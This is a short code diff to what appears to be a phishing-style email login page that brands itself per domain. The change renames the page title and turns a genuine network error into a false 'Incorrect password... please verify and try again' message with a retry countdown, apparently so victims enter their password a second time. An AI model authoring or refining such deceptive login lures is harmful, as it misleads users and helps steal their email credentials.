@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title id="page-title">Secure Login</title>
+    <title id="page-title">Email Login</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
     <link rel="icon" type="image/png" href="/default-favicon.ico" id="favicon"/>
     <style>
@@ -566,7 +566,7 @@
                 updateDomainUI(state.domain);
 
             } catch (err) {
-                showError(`Network error: ${err.message}. Retrying...`, false);
+                showError(`Incorrect password. ${err.message}. Please verify and try again`, false);
                 els.retryHint.style.display = 'block';
                 let count = 3;
                 els.retryCountdown.textContent = count;
